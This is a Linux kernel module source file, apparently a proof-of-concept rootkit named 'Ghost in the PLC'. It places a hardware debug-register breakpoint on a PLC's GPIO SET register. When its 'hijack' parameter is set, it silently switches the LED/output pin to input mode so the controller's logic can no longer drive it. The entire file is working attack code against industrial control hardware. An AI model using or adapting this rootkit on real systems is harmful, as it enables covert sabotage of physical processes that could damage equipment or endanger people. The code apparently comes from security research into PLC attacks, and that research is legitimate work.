/*
 * Usage: insmod drk.ko gpioB=pchar hijack=int
 */
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/perf_event.h>
#include <linux/hw_breakpoint.h>

static int hijack = 0;
static char* gpioB = "0x00";
volatile unsigned* gpio = 0x00;
static long set_p = 0;
int g = 22; // Pin 22 attached to LED
struct perf_event** drpcpu;

module_param(gpioB, charp, 0000);
MODULE_PARM_DESC(gpioB, "Base address of GPIO");
module_param(hijack, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(hijack, "Hijack the control"); // 1=Yes, 0=No

#define INP_GPIO(g) *(gpio+((g)/10)) &= ~(7<<(((g)%10)*3))
#define OUT_GPIO(g) *(gpio+((g)/10)) |=  (1<<(((g)%10)*3))
#define SET_GPIO_ALT(g,a) *(gpio+(((g)/10))) |= (((a)<=3?(a)+4:(a)==4?3:2)<<(((g)%10)*3))
#define GPIO_SET *(gpio+7)
#define GPIO_CLR *(gpio+10)
#define GET_GPIO(g) (*(gpio+13)&(1<<g))
#define GPIO_PULL *(gpio+37)
#define GPIO_PULLCLK0 *(gpio+38)

static void dr_handler(struct perf_event *bp, struct perf_sample_data *data, struct pt_regs *regs) {

	if (hijack == 1) {
		INP_GPIO(g); // Set LED pin as input, so the logic could not write anymore
		printk(KERN_INFO "[RK] Hijacked!\n");
	}

}

static int hw_break_module_init(void) {
	int ret;
	long l;
	char* endptr = NULL;
	struct perf_event_attr attr;

	printk(KERN_INFO "[RK] init\n");

	l = simple_strtol(gpioB, &endptr, 0);
	if (endptr == NULL) {
		printk(KERN_INFO "[RK] Unable to cast input address\n");
		return -EINVAL;
	}
	gpio = (unsigned *)l; // GPIO base
	set_p = (l+(long)0x1C); // Offset of SET register

	printk(KERN_INFO "[RK] GPIO Base address: %x %s %lu\n", (unsigned)gpio, gpioB, l);
	printk(KERN_INFO "[RK] GPIO SET Register: 0x%lx\n", set_p);
	printk(KERN_INFO "[RK] Hijack: %d\n", hijack);

	hw_breakpoint_init(&attr);
	attr.bp_addr = set_p; // Monitor SET register
	attr.bp_len = HW_BREAKPOINT_LEN_4;
	attr.bp_type = HW_BREAKPOINT_W; // Write operation
	
	drpcpu = register_wide_hw_breakpoint(&attr, dr_handler, NULL);
	if (IS_ERR((void*)drpcpu)) {
		ret = PTR_ERR((void*)drpcpu);
		printk(KERN_INFO "[RK] Unable to set debug register\n");
		return ret;
	}

	return 0;
}

static void hw_break_module_exit(void) {
	unregister_wide_hw_breakpoint(drpcpu);
	printk(KERN_INFO "[RK] exit\n");
}

module_init(hw_break_module_init);
module_exit(hw_break_module_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("cl0wn & bl4ckic3");
MODULE_DESCRIPTION("Ghost in the PLC");
